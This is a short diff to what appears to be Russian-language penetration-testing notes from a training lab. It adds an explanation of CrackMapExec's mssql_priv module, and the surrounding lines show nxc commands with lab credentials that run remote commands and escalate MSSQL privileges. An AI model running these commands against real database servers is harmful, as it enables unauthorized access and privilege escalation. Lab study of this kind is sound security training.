@@ -253,7 +253,12 @@ export KRB5CCNAME=sqlsvc.ccache
             nxc mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x "dir c:\Users\Public"
 
         # Повышение привилегий в MSSQL 
-
+            
+            crackmapexec mssql -M mssql_priv --options
+            
+            mssql_priv -->  EXECUTE AS LOGIN и db_owner role (использует 2 метода)
+            enum_privsдля отображения списка привилегий (по умолчанию),
+            
             nxc mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv
 
             nxc mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
